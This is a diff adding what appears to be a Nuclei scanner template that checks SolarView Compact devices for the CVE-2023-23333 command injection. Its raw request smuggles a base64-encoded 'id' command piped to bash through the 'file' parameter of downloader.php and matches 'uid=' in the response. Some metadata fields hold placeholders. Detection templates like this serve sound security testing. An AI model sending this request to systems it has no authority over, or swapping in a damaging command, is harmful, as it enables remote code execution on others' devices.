@@ -1,0 +1,25 @@
+id: solarview-commnd
+info:
+  name: solarview-commnd
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://github.com/MrWQ/vulnerability-paper/blob/7551f7584bd35039028b1d9473a00201ed18e6b2/bugs/(CVE-2023-23333)%20_%20SolarView%20Compact%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /downloader.php?file=;echo%20{aWQ=}|base64%20-d|bash%00.zip HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
